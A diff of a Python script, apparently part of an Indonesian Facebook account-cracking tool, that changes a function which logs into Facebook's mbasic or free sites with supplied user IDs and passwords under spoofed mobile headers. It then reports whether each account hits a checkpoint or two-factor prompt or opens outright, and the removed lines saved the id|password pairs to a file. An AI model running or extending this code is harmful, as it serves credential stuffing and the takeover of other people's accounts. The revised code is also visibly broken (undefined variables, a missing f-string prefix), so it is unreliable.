@@ -2949,31 +2949,36 @@ def cek_apk(kuki):
 		print ("\r    %s \033[0mcookie invalid"%(M))
 
 def ceker(idf,pw):
-	global cp
-	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
-	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-	ses = requests.Session()
 	try:
-		hi = ses.get('https://mbasic.facebook.com')
-		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
-		jo = ho.find('form')
-		data = {}
-		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
-		for anj in jo('input'):
-			if anj.get('name') in lion:
-				data.update({anj.get('name'):anj.get('value')})
-		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
-		print('\r%s    [+] Opsi CheckPoint :   %s'%(b,idf,pw,x))
-		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-		opsi = kent.find_all('option')
-		if len(opsi)==0:
-			print('\r%s    [+] Tap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
+		ml = random.choice(['mbasic','free'])
+		h2 = {'host':'{ml}.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
+		res = ses.get(f'https://{ml}.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
+		ress = parser(res, 'html.parser')
+		form = ress.find('form',{'method':'post'})
+		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
+		data2.update({
+					'email':idf,
+					'pass':pw})
+		res = ses.post('https://{ml}.facebook.com'+form.get('action'),data=data2,headers=h2).text
+		ress = parser(res, 'html.parser')
+		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
+			akun += f' [+] Akun Tap Yess Cek Di Mbasic                   '
 		else:
-			for opsii in opsi:
-				print('\r%s   [+] %s%s'%(kk,opsii.text,x))
-	except Exception as c:
-		print('\r%s    [+] Tidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
-		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			if(len(sesi(res))==0):
+				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
+					akun += f' [+] Akun Terpasang A2F                    '
+				else:
+					akun += f' [+] Akun Tidak Checkpoint Cek Di Mbasic                  '
+			else:
+				akun += f' [+] Terdapat {len(opsi)} Opsi Checkpoint :                     '
+				o = 0
+				for cp in opsi:
+					o+=1
+					akun += f' [+] {cp}               '
+		opsi.clear()
+	except Exception as e:
+		akun += f' [+] Kata Sandi Salah Kemungkinan Anda Terkena Spam Ip                  '
+	print(akun)
 	
 #-----------------------[ DEF CEK OPSI ]--------------------#
 import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
